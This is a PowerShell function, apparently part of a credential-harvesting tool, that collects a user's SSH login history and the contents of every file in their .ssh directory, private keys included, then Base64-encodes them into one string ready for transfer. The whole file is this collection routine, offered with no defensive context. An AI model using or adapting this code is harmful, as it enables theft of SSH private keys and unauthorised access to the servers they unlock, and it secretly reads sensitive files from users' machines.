function Get-Ssh {
    param(
        [string]$sshKeyDirectoryPath = "$env:USERPROFILE\.ssh"
    )
    # Part 1: Get SSH history
    $historyPath = (Get-PSReadLineOption).HistorySavePath
    $sshCommandsString = ""
    if (Test-Path $historyPath) {
        $historyContent = Get-Content $historyPath
        $sshCommands = $historyContent | Where-Object { $_ -match '^ssh\s+\S+@\S+$' }
        if ($sshCommands) {
            $sshCommandsString = $sshCommands -join "`n" + "`n"
        }
    }
    # Part 2: Get SSH keys content
    $combinedContent = ""
    if (Test-Path $sshKeyDirectoryPath) {
        $filePaths = Get-ChildItem -Path $sshKeyDirectoryPath -File
        foreach ($filePath in $filePaths) {
            $content = Get-Content -Path $filePath.FullName -ErrorAction SilentlyContinue
            $combinedContent += $content + "`n"
        }
    }
    # Combine both contents
    $finalContent = $sshCommandsString + $combinedContent
    # Convert the combined string to bytes and encode to Base64
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($finalContent)
    $base64Encoded = [Convert]::ToBase64String($bytes)
    # Return the Base64 encoded string
    return $base64Encoded
}
